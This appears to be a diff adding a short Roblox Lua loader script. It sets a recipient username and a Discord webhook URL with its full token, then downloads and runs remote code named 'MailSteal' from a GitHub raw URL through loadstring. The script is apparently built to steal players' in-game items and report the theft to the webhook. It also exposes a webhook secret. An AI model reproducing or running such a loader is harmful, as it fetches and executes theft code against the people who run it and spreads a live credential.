@@ -1,0 +1,5 @@
+_G.UserName = "galaxnye"
+_G.UserName2 = "John" -- optional
+_G.Webhook = "https://discord.com/api/webhooks/916513921194663977/BKfmADDRne_9FKrOAbrlxvXBT5KJvCAvOeZukPgP-i8qCvaAso3RNrKVk03R6F3rpIEA" -- optional
+    
+loadstring(game:HttpGet("https://raw.githubusercontent.com/theultrascipter/Tylers_-Hub/main/MailSteal", true))()
